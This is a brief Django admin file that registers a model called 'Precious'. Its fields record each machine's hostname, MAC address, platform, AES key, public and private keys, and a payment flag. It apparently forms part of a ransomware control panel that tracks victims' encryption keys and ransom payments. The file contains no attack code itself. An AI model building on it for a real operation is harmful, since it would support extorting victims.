# encoding=utf-8

from django.contrib import admin
from .models import Precious


class PreciousAdmin(admin.ModelAdmin):

    fieldsets = (
        ('Admin', {'fields': ('hash', 'platform', 'hostname', 'mac', 'aes_key', 'public_key', 'private_key', 'pay', 'timestamp', )}),
    )
    list_display = ['hash', 'platform', 'hostname', 'aes_key', 'pay', 'timestamp', ]


admin.site.register(Precious, PreciousAdmin)
